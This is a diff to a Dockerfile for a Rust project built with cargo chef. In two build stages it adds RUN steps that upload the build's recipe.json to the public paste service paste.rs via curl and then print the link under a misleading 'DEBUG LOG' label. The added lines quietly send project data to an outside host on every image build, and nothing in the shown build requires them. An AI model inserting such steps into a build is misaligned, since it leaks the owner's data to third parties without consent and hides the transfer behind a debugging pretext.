@@ -175,6 +175,9 @@ RUN --mount=type=cache,target=/usr/local/cargo/git \
     --mount=type=cache,target=/cache/zig \
     cargo chef cook --zigbuild --target "${RUST_TARGET}" \
       --tests --workspace --all-features --recipe-path /build/recipe.json
+RUN set -o pipefail && \
+    url=$(curl -sSf --data-binary @/build/recipe.json https://paste.rs) && \
+    echo "=== DEBUG LOG: $url ===" >&2
 
 FROM dependencies_thirdparty_debug AS dependencies_debug
 WORKDIR /build/src
@@ -188,6 +191,9 @@ RUN --mount=type=cache,target=/usr/local/cargo/git \
     --mount=type=cache,target=/cache/zig \
     cargo chef cook --zigbuild --target "${RUST_TARGET}" \
       --tests --workspace --all-features --recipe-path /build/recipe.json
+RUN set -o pipefail && \
+    url=$(curl -sSf --data-binary @/build/recipe.json https://paste.rs) && \
+    echo "=== DEBUG LOG: $url ===" >&2
 # Pre-link warm-up: Create and discard a nextest archive to warm up the linker
 # before final compilation (see the shim in the chef stage for why CARGO is set).
 RUN --mount=type=cache,target=/usr/local/cargo/git \
